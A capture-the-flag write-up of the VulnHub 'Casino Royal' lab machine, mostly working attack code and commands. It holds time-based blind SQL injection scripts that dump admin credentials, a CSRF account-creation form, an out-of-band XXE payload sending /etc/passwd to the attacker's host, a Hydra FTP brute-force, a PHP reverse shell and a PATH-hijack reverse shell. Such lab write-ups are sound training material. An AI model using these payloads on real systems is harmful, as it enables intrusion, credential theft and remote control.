---
layout: single
title: Casino Royal - VulnHub
excerpt: "On this machine, we are exploiting Insecure Cookie Handling, Time-Based SQL Injection, DOM XXE, and SUID with PATH Hijacking. Additionally, we performed brute force on an FTP user and achieved a file upload with a bypass."
date: 2025-03-25
classes: wide
header:
  teaser: /img2/casinoroyal.png
  teaser_home_page: true
  icon: /img2/vulnhub.png
categories:
  - vulnhub
  - Linux
  - Medium
tags:
  - Insecure Cookie Handling
  - SQL Injection
  - CSRF
  - SMTP
  - XXE
  - SUID
  - PATH Hijacking
---


![](/img2/Pasted%20image%2020250325190748.png)

## Introduction

> On this machine, we are exploiting Insecure Cookie Handling, Time-Based SQL Injection, DOM XXE, and SUID with PATH Hijacking. Additionally, we performed brute force on an FTP user and achieved a file upload with a bypass.

## Reconnaissance

- Nmap 

```bash
nmap -sS --open -p- --min-rate 5000 -vvv -n -Pn 192.168.1.147
```

![](/img2/Pasted%20image%2020250323162421.png)

- Vulnerability and version scan

```bash
nmap -sCV -p21,25,80,8081 192.168.1.147
```

![](/img2/Pasted%20image%2020250323162547.png)

- Gobuster

```bash
gobuster dir -u http://192.168.1.147/ -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -t 50 -b 403,404
```

![](/img2/Pasted%20image%2020250323181851.png)

- Searchsploit 

![](/img2/Pasted%20image%2020250323182032.png)

```bash
searchsploit pokermax
```

![](/img2/Pasted%20image%2020250323182140.png)

```bash
searchsploit -x php/webapps/6766.txt
```

![](/img2/Pasted%20image%2020250323182419.png)

## Exploitation

- Insecure Cookie Handling (OPTION 1)

![](/img2/Pasted%20image%2020250323182626.png)

![](/Img2/Pasted%20image%2020250323192238.png)

- Find SQLI Time Based (OPTION 2)

![](/img2/Pasted%20image%2020250323182950.png)

- Python script to get all databases

```python
#!/usr/bin/env python3

import requests
import signal
import sys
import string
import time
from pwn import *


def def_handler(sig,frame):
	print("\n\n[!] Exiting...\n")
	sys.exit(1)


signal.signal(signal.SIGINT,def_handler)


url = "http://192.168.1.147/pokeradmin/"
characters = string.ascii_lowercase + "_,-" + string.digits


headers = {
    "Content-Type": "application/x-www-form-urlencoded",
}


def SQLI():
	p1=log.progress("Brute Force")
	p1.status("Starting Attack")

	time.sleep(2)

	p2=log.progress("Data")
	info=""

	for position in range(1,1000):
		for character in characters:
	
			data = {
  			'op': 'adminlogin',
  			'username' : f"admin'and if(substring((select group_concat(schema_name) from information_schema.schemata),{position},1)='{character}',sleep(0.3),1)-- -",
  			'password' : 'test'}

			old_time=time.time()

			r = requests.post(url,data=data,headers=headers)

			new_time=time.time()
			if new_time-old_time >0.2:
				info+=character
				p2.status(info)
				break

SQLI()
```

```bash
python3 sqlidb.py
```

![](/img2/Pasted%20image%2020250323183306.png)

- Python script to get actual database tables

```python
#!/usr/bin/env python3

import requests
import signal
import sys
import string
import time
from pwn import *


def def_handler(sig,frame):
	print("\n\n[!] Exiting...\n")
	sys.exit(1)


signal.signal(signal.SIGINT,def_handler)


url = "http://192.168.1.147/pokeradmin/"
characters = string.ascii_lowercase + "_,-" + string.digits


headers = {
    "Content-Type": "application/x-www-form-urlencoded",
}


def SQLI():
	p1=log.progress("Brute Force")
	p1.status("Starting Attack")

	time.sleep(2)

	p2=log.progress("Data")
	info=""

	for position in range(1,1000):
		for character in characters:
	
			data = {
  			'op': 'adminlogin',
  			'username' : f"admin'and if(substring((select group_concat(table_name) from information_schema.tables where table_schema=database()),{position},1)='{character}',sleep(0.3),1)-- -",
  			'password' : 'test'}

			old_time=time.time()

			r = requests.post(url,data=data,headers=headers)

			new_time=time.time()
			if new_time-old_time >0.2:
				info+=character
				p2.status(info)
				break

SQLI()
```

```bash
python3 sqlitables.py
```

![](/img2/Pasted%20image%2020250323191028.png)

- Python script to get pokermax_admin columns

```python
#!/usr/bin/env python3

import requests
import signal
import sys
import string
import time
from pwn import *


def def_handler(sig,frame):
	print("\n\n[!] Exiting...\n")
	sys.exit(1)


signal.signal(signal.SIGINT,def_handler)


url = "http://192.168.1.147/pokeradmin/"
characters = string.ascii_lowercase + "_,-" + string.digits


headers = {
    "Content-Type": "application/x-www-form-urlencoded",
}


def SQLI():
	p1=log.progress("Brute Force")
	p1.status("Starting Attack")

	time.sleep(2)

	p2=log.progress("Data")
	info=""

	for position in range(1,1000):
		for character in characters:
	
			data = {
  			'op': 'adminlogin',
  			'username' : f"admin'and if(substring((select group_concat(column_name) from information_schema.columns where table_name='pokermax_admin'),{position},1)='{character}',sleep(0.3),1)-- -",
  			'password' : 'test'}

			old_time=time.time()

			r = requests.post(url,data=data,headers=headers)

			new_time=time.time()
			if new_time-old_time >0.2:
				info+=character
				p2.status(info)
				break

SQLI()
```

```bash
python3 sqlicolumns.py
```

![](/img2/Pasted%20image%2020250323191429.png)

- Python script to get username and password

```python
#!/usr/bin/env python3

import requests
import signal
import sys
import string
import time
from pwn import *


def def_handler(sig,frame):
	print("\n\n[!] Exiting...\n")
	sys.exit(1)


signal.signal(signal.SIGINT,def_handler)


url = "http://192.168.1.147/pokeradmin/"
characters = string.ascii_lowercase + "_,-:" + string.digits


headers = {
    "Content-Type": "application/x-www-form-urlencoded",
}


def SQLI():
	p1=log.progress("Brute Force")
	p1.status("Starting Attack")

	time.sleep(2)

	p2=log.progress("Data")
	info=""

	for position in range(1,1000):
		for character in characters:
	
			data = {
  			'op': 'adminlogin',
  			'username' : f"admin'and if(substring((select group_concat(username,':',password) from pokermax_admin),{position},1)='{character}',sleep(0.3),1)-- -",
  			'password' : 'test'}

			old_time=time.time()

			r = requests.post(url,data=data,headers=headers)

			new_time=time.time()
			if new_time-old_time >0.2:
				info+=character
				p2.status(info)
				break

SQLI()
```

```bash
python3 sqlidata.py
```

![](/img2/Pasted%20image%2020250323192314.png)

- Find leaked data 

![](/img2/Pasted%20image%2020250323192946.png)

```bash
echo "192.168.1.147 casino-royale.local" >> /etc/hosts
```

![](/img2/Pasted%20image%2020250323193249.png)

- Searchsploit

```bash
searchsploit snowfox
```

![](/img2/Pasted%20image%2020250323193439.png)

```bash
searchsploit -m php/webapps/35301.html
```

- CSRF

```html
<html>
  <body>
    <form action="http://casino-royale.local/vip-client-portfolios/?uri=admin/accounts/create" method="POST">
      <input type="hidden" name="emailAddress" value="lab@zeroscience.mk" />
      <input type="hidden" name="verifiedEmail" value="verified" />
      <input type="hidden" name="username" value="pyuser" />
      <input type="hidden" name="newPassword" value="pyuser123" />
      <input type="hidden" name="confirmPassword" value="pyuser123" />
      <input type="hidden" name="userGroups[]" value="34" />
      <input type="hidden" name="userGroups[]" value="33" />
      <input type="hidden" name="memo" value="CSRFmemo" />
      <input type="hidden" name="status" value="1" />
      <input type="hidden" name="formAction" value="submit" />
      <input type="submit" value="Submit form" />
    </form>
  </body>
</html>
```

```bash
telnet 192.168.1.147 25
```

![](/img2/Pasted%20image%2020250323195641.png)

```bash
python3 -m http.server 80
```

![](/img2/Pasted%20image%2020250323195722.png)

![](/img2/Pasted%20image%2020250323195545.png)

- Find leaked data 

![](/img2/Pasted%20image%2020250323200051.png)

- FInd XXE Out-of-Band (OOB)

![](/img2/Pasted%20image%2020250323200659.png)

```bash
python3 -m http.server 80
```

![](/img2/Pasted%20image%2020250323200745.png)

```xml
<!ENTITY % file SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://192.168.1.142/?file=%file;'>">
%eval;
%exfil;
```

![](/img2/Pasted%20image%2020250323202846.png)

```bash
python3 -m http.server 80
```

![](/img2/Pasted%20image%2020250323202925.png)

```bash
echo "cm9vdDp4OjA6MDpyb290Oi9yb290Oi9iaW4vYmFzaApkYWVtb246eDoxOjE6ZGFlbW9uOi91c3Ivc2JpbjovdXNyL3NiaW4vbm9sb2dpbgpiaW46eDoyOjI6YmluOi9iaW46L3Vzci9zYmluL25vbG9naW4Kc3lzOng6MzozOnN5czovZGV2Oi91c3Ivc2Jpbi9ub2xvZ2luCnN5bmM6eDo0OjY1NTM0OnN5bmM6L2JpbjovYmluL3N5bmMKZ2FtZXM6eDo1OjYwOmdhbWVzOi91c3IvZ2FtZXM6L3Vzci9zYmluL25vbG9naW4KbWFuOng6NjoxMjptYW46L3Zhci9jYWNoZS9tYW46L3Vzci9zYmluL25vbG9naW4KbHA6eDo3Ojc6bHA6L3Zhci9zcG9vbC9scGQ6L3Vzci9zYmluL25vbG9naW4KbWFpbDp4Ojg6ODptYWlsOi92YXIvbWFpbDovdXNyL3NiaW4vbm9sb2dpbgpuZXdzOng6OTo5Om5ld3M6L3Zhci9zcG9vbC9uZXdzOi91c3Ivc2Jpbi9ub2xvZ2luCnV1Y3A6eDoxMDoxMDp1dWNwOi92YXIvc3Bvb2wvdXVjcDovdXNyL3NiaW4vbm9sb2dpbgpwcm94eTp4OjEzOjEzOnByb3h5Oi9iaW46L3Vzci9zYmluL25vbG9naW4Kd3d3LWRhdGE6eDozMzozMzp3d3ctZGF0YTovdmFyL3d3dzovYmluL3NoCmJhY2t1cDp4OjM0OjM0OmJhY2t1cDovdmFyL2JhY2t1cHM6L3Vzci9zYmluL25vbG9naW4KbGlzdDp4OjM4OjM4Ok1haWxpbmcgTGlzdCBNYW5hZ2VyOi92YXIvbGlzdDovdXNyL3NiaW4vbm9sb2dpbgppcmM6eDozOTozOTppcmNkOi92YXIvcnVuL2lyY2Q6L3Vzci9zYmluL25vbG9naW4KZ25hdHM6eDo0MTo0MTpHbmF0cyBCdWctUmVwb3J0aW5nIFN5c3RlbSAoYWRtaW4pOi92YXIvbGliL2duYXRzOi91c3Ivc2Jpbi9ub2xvZ2luCm5vYm9keTp4OjY1NTM0OjY1NTM0Om5vYm9keTovbm9uZXhpc3RlbnQ6L3Vzci9zYmluL25vbG9naW4Kc3lzdGVtZC10aW1lc3luYzp4OjEwMDoxMDI6c3lzdGVtZCBUaW1lIFN5bmNocm9uaXphdGlvbiwsLDovcnVuL3N5c3RlbWQ6L2Jpbi9mYWxzZQpzeXN0ZW1kLW5ldHdvcms6eDoxMDE6MTAzOnN5c3RlbWQgTmV0d29yayBNYW5hZ2VtZW50LCwsOi9ydW4vc3lzdGVtZC9uZXRpZjovYmluL2ZhbHNlCnN5c3RlbWQtcmVzb2x2ZTp4OjEwMjoxMDQ6c3lzdGVtZCBSZXNvbHZlciwsLDovcnVuL3N5c3RlbWQvcmVzb2x2ZTovYmluL2ZhbHNlCnN5c3RlbWQtYnVzLXByb3h5Ong6MTAzOjEwNTpzeXN0ZW1kIEJ1cyBQcm94eSwsLDovcnVuL3N5c3RlbWQ6L2Jpbi9mYWxzZQpfYXB0Ong6MTA0OjY1NTM0Ojovbm9uZXhpc3RlbnQ6L2Jpbi9mYWxzZQpydGtpdDp4OjEwNToxMDk6UmVhbHRpbWVLaXQsLCw6L3Byb2M6L2Jpbi9mYWxzZQptZXNzYWdlYnVzOng6MTA2OjExMDo6L3Zhci9ydW4vZGJ1czovYmluL2ZhbHNlCnVzYm11eDp4OjEwNzo0Njp1c2JtdXggZGFlbW9uLCwsOi92YXIvbGliL3VzYm11eDovYmluL2ZhbHNlCnNwZWVjaC1kaXNwYXRjaGVyOng6MTA4OjI5OlNwZWVjaCBEaXNwYXRjaGVyLCwsOi92YXIvcnVuL3NwZWVjaC1kaXNwYXRjaGVyOi9iaW4vZmFsc2UKbGlnaHRkbTp4OjEwOToxMTM6TGlnaHQgRGlzcGxheSBNYW5hZ2VyOi92YXIvbGliL2xpZ2h0ZG06L2Jpbi9mYWxzZQpwdWxzZTp4OjExMDoxMTQ6UHVsc2VBdWRpbyBkYWVtb24sLCw6L3Zhci9ydW4vcHVsc2U6L2Jpbi9mYWxzZQphdmFoaTp4OjExMToxMTc6QXZhaGkgbUROUyBkYWVtb24sLCw6L3Zhci9ydW4vYXZhaGktZGFlbW9uOi9iaW4vZmFsc2UKc2FuZWQ6eDoxMTI6MTE4OjovdmFyL2xpYi9zYW5lZDovYmluL2ZhbHNlCmxlOng6MTAwMDoxMDAwOkxlIENoaWZmcmUsLCw6L2hvbWUvbGU6L2Jpbi9iYXNoCm15c3FsOng6MTEzOjEyMDpNeVNRTCBTZXJ2ZXIsLCw6L25vbmV4aXN0ZW50Oi9iaW4vZmFsc2UKdmFsZW5rYTp4OjEwMDE6MTAwMTosLCw6L2hvbWUvdmFsZW5rYTovYmluL2Jhc2gKcG9zdGZpeDp4OjExNDoxMjE6Oi92YXIvc3Bvb2wvcG9zdGZpeDovYmluL2ZhbHNlCmZ0cDp4OjExNToxMjQ6ZnRwIGRhZW1vbiwsLDovc3J2L2Z0cDovYmluL2ZhbHNlCmZ0cFVzZXJVTFRSQTp4OjEwMDI6MTAwMjo6L3Zhci93d3cvaHRtbC91bHRyYS1hY2Nlc3MtdmlldzovYmluL2Jhc2gK" | base64 -d;echo
```

![](/img2/Pasted%20image%2020250323203034.png)

- Hydra

```bash
hydra -l ftpUserULTRA -P /usr/share/wordlists/rockyou.txt ftp://192.168.1.147 -t 50
```

![](/Img2/Pasted%20image%2020250323213303.png)

- Reverse shell

```php
<?php system('bash -c "bash -i >& /dev/tcp/192.168.1.142/9000 0>&1"')?>
```

```bash
ftp 192.168.1.147
```

![](/img2/Pasted%20image%2020250323224041.png)

![](/img2/Pasted%20image%2020250323224120.png)

```bash
nc -nlvp 9000
```

## Post-exploitation

- Search SUID files

```bash
find / -perm -4000 -ls 2>/dev/null
```

![](/img2/Pasted%20image%2020250325182707.png)

```bash
cd /opt/casino-royale/
./mi6_detect_test
```

![](/img2/Pasted%20image%2020250325182836.png)

> This script run ps command, we can try PATH Hijacking

- PATH Hijacking

```bash
export PATH=/tmp/:$PATH
echo "bash -i >& /dev/tcp/192.168.1.142/4444 0>&1" > /tmp/ps
chmod +x /tmp/ps
```

```bash
./mi6_detect_test
nc -nlvp 4444
```


![](/img2/Pasted%20image%2020250325183815.png)